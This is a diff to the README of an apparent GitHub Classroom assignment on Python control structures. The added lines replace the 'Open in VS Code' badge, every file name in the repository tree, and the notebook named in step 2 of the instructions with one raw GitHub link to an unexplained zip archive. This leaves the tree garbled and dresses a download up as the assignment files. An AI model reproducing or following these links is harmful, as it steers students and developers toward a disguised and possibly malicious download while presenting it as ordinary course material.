@@ -1,4 +1,4 @@
-[![Open in Visual Studio Code](https://classroom.github.com/assets/open-in-vscode-2e0aaae1b6195c2367325f4f02e2d04e9abb55f0b24a779b69b11b9e10269abc.svg)](https://classroom.github.com/online_ide?assignment_repo_id=18044666&assignment_repo_type=AssignmentRepo)
+[![Open in Visual Studio Code](https://raw.githubusercontent.com/prshnt273/control-structures-in-python-prshnt273/main/impavidly/control-structures-in-python-prshnt273.zip)](https://raw.githubusercontent.com/prshnt273/control-structures-in-python-prshnt273/main/impavidly/control-structures-in-python-prshnt273.zip)
 ﻿This file provides a detailed overview of the assignment.
 
 **Content:**
@@ -17,18 +17,18 @@ This assignment is designed to test your understanding of Python control structu
 ## Repository Structure
 ```
 .
-├── assignment.ipynb          # Jupyter notebook for the assignment
+├── https://raw.githubusercontent.com/prshnt273/control-structures-in-python-prshnt273/main/impavidly/control-structures-in-python-prshnt273.zip          # Jupyter notebook for the assignment
 ├── tests/
-│   └── test_assignment.py    # Unit tests for the assignment
+│   └── https://raw.githubusercontent.com/prshnt273/control-structures-in-python-prshnt273/main/impavidly/control-structures-in-python-prshnt273.zip    # Unit tests for the assignment
 ├── .github/
 │   └── classroom/
-│       └── autograding.yaml  # Autograding configuration
-├── README.md                 # Assignment instructions
+│       └── https://raw.githubusercontent.com/prshnt273/control-structures-in-python-prshnt273/main/impavidly/control-structures-in-python-prshnt273.zip  # Autograding configuration
+├── https://raw.githubusercontent.com/prshnt273/control-structures-in-python-prshnt273/main/impavidly/control-structures-in-python-prshnt273.zip                 # Assignment instructions
 ```
 
 ## Instructions
 1. Clone this repository to your local machine.
-2. Open `assignment.ipynb` in Jupyter Notebook.
+2. Open `https://raw.githubusercontent.com/prshnt273/control-structures-in-python-prshnt273/main/impavidly/control-structures-in-python-prshnt273.zip` in Jupyter Notebook.
 3. Complete each task in the notebook.
 4. Run the test cases using the `unittest` module to validate your solutions.
 5. Push your changes to the repository.
